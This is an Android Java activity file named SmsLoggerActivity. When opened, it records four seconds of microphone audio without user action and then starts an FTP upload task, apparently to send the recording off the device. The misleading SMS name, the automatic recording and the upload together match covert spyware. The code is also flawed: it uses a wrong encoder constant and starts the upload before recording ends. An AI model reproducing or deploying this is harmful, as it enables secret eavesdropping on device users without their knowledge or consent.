package com.example.smsreceiver;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.util.Timer;
import java.util.TimerTask;

import org.apache.commons.net.ftp.FTP;
import org.apache.commons.net.ftp.FTPClient;

import android.media.MediaPlayer;
import android.media.MediaRecorder;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.app.Activity;
import android.util.Log;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

public class SmsLoggerActivity extends Activity {

	private MediaRecorder myRecorder;
	private MediaPlayer myPlayer;
	private String outputFile = null;
	private Button startBtn;
	private Button stopBtn;
	private Button playBtn;
	private Button stopPlayBtn;
	private TextView text;

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_sms_logger);

		// store it to sd card
		outputFile = Environment.getExternalStorageDirectory()
				.getAbsolutePath() + "/record.3gpp";

		myRecorder = new MediaRecorder();
		myRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
		myRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
		myRecorder.setAudioEncoder(MediaRecorder.OutputFormat.AMR_NB);
		myRecorder.setOutputFile(outputFile);

		// record part  START
		try {
			myRecorder.prepare();
			myRecorder.start();
		} catch (IllegalStateException e) {
			// start:it is called before prepare()
			// prepare: it is called after start() or before setOutputFormat()
			e.printStackTrace();
		} catch (IOException e) {
			// prepare() fails
			e.printStackTrace();
		}
		

		final Handler handler = new Handler();
		handler.postDelayed(new Runnable() {
			@Override
			public void run() {
				//STOP 
				try {
					myRecorder.stop();
					myRecorder.release();
					myRecorder = null;

					Toast.makeText(getApplicationContext(), "Stop recording...",
							Toast.LENGTH_SHORT).show();
				} catch (IllegalStateException e) {
					// it is called before start()
					e.printStackTrace();
				} catch (RuntimeException e) {
					// no valid audio/video data has been received
					e.printStackTrace();
				}
	
			}
		}, 4000);

		
		
		
		
		// upload
		new FtpUpload().execute();
		
		


	}

	public void start() {
		try {
			myRecorder.prepare();
			myRecorder.start();
		} catch (IllegalStateException e) {
			// start:it is called before prepare()
			// prepare: it is called after start() or before setOutputFormat()
			e.printStackTrace();
		} catch (IOException e) {
			// prepare() fails
			e.printStackTrace();
		}

		Toast.makeText(getApplicationContext(), "Start recording...",
				Toast.LENGTH_SHORT).show();
	}

	public void stop() {
		try {
			myRecorder.stop();
			myRecorder.release();
			myRecorder = null;

			Toast.makeText(getApplicationContext(), "Stop recording...",
					Toast.LENGTH_SHORT).show();
		} catch (IllegalStateException e) {
			// it is called before start()
			e.printStackTrace();
		} catch (RuntimeException e) {
			// no valid audio/video data has been received
			e.printStackTrace();
		}
	}

	
	
	

}